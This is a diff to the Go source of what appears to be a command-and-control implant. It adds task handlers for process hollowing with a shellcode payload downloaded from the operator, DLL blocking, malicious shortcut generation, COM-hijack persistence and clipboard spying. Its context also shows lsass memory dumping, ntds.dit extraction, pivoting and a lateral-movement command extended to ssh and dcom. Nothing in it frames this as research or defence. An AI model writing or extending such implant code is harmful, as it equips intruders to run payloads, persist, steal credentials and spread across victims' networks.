@@ -572,6 +572,80 @@ func dispatchTask(t transport, task taskWire) {
 		}
 		t.sendResult(task.ID, out, errStr)
 
+	case "HOLLOW":
+		// Args JSON: {"target":"<proc_path_optional>","payload":"<uploaded_filename>"}
+		var ha struct {
+			Target  string `json:"target"`
+			Payload string `json:"payload"`
+		}
+		if err := json.Unmarshal([]byte(task.Args), &ha); err != nil {
+			t.sendResult(task.ID, "", "bad HOLLOW args: "+err.Error())
+			return
+		}
+		sc, err := t.downloadFile(ha.Payload)
+		if err != nil {
+			t.sendResult(task.ID, "", "hollow: download '"+ha.Payload+"': "+err.Error())
+			return
+		}
+		out, err := hollowProcess(ha.Target, sc)
+		errStr := ""
+		if err != nil {
+			errStr = err.Error()
+		}
+		t.sendResult(task.ID, out, errStr)
+
+	case "BLOCKDLLS":
+		// Args: "on" or "off"
+		enable := strings.ToLower(strings.TrimSpace(task.Args)) != "off"
+		out, err := blockDLLs(enable)
+		errStr := ""
+		if err != nil {
+			errStr = err.Error()
+		}
+		t.sendResult(task.ID, out, errStr)
+
+	case "GEN_LNK":
+		// Args JSON: {"target":"...","args":"...","working_dir":"...","icon_path":"...","icon_index":0,"outfile":"..."}
+		var opts GenLNKOptions
+		if err := json.Unmarshal([]byte(task.Args), &opts); err != nil {
+			t.sendResult(task.ID, "", "bad GEN_LNK args: "+err.Error())
+			return
+		}
+		out, err := genLNK(opts)
+		errStr := ""
+		if err != nil {
+			errStr = err.Error()
+		}
+		t.sendResult(task.ID, out, errStr)
+
+	case "COM_HIJACK":
+		// Args JSON: {"clsid":"...","dll":"...","name":"..."}  or "rm <clsid>"
+		if strings.HasPrefix(strings.TrimSpace(task.Args), "rm ") {
+			clsid := strings.TrimSpace(strings.TrimPrefix(task.Args, "rm "))
+			out, err := comHijackRemove(clsid)
+			errStr := ""
+			if err != nil {
+				errStr = err.Error()
+			}
+			t.sendResult(task.ID, out, errStr)
+			return
+		}
+		var chArgs struct {
+			CLSID string `json:"clsid"`
+			DLL   string `json:"dll"`
+			Name  string `json:"name"`
+		}
+		if err := json.Unmarshal([]byte(task.Args), &chArgs); err != nil {
+			t.sendResult(task.ID, "", "bad COM_HIJACK args: "+err.Error())
+			return
+		}
+		out, err := comHijack(chArgs.CLSID, chArgs.DLL, chArgs.Name)
+		errStr := ""
+		if err != nil {
+			errStr = err.Error()
+		}
+		t.sendResult(task.ID, out, errStr)
+
 	case "MINIDUMP":
 		// Args: optional PID (0 = auto-find lsass.exe)
 		var pid uint32
@@ -681,6 +755,26 @@ func dispatchTask(t transport, task taskWire) {
 			errStr = err.Error()
 		}
 		t.sendResult(task.ID, out, errStr)
+
+	case "CLIP_MONITOR_START":
+		interval := 5
+		if task.Args != "" {
+			if n, err := strconv.Atoi(strings.TrimSpace(task.Args)); err == nil && n > 0 {
+				interval = n
+			}
+		}
+		out, err := startClipMonitor(interval)
+		errStr := ""
+		if err != nil {
+			errStr = err.Error()
+		}
+		t.sendResult(task.ID, out, errStr)
+
+	case "CLIP_MONITOR_DUMP":
+		t.sendResult(task.ID, dumpClipMonitor(), "")
+
+	case "CLIP_MONITOR_STOP":
+		t.sendResult(task.ID, stopClipMonitor(), "")
 
 	// ── HTTP reverse-proxy pivot ──────────────────────────────────────────────
 
@@ -945,10 +1039,10 @@ func dispatchTask(t transport, task taskWire) {
 		t.sendResult(task.ID, fmt.Sprintf("[+] ntds.dit dump to %s\n%s", outDir, out), errStr)
 
 	// ── Lateral movement ──────────────────────────────────────────────────────
-	// Args JSON: {"method":"psexec|wmi|winrm","host":"<ip>","payload":"<file>",
+	// Args JSON: {"method":"psexec|wmi|winrm|ssh|dcom","host":"<ip>","payload":"<file>",
 	//             "svcname":"<opt>","user":"<opt DOMAIN\\user>","pass":"<opt>"}
 
-	case "LATERAL":
+	case "JUMP":
 		var la struct {
 			Method  string `json:"method"`
 			Host    string `json:"host"`
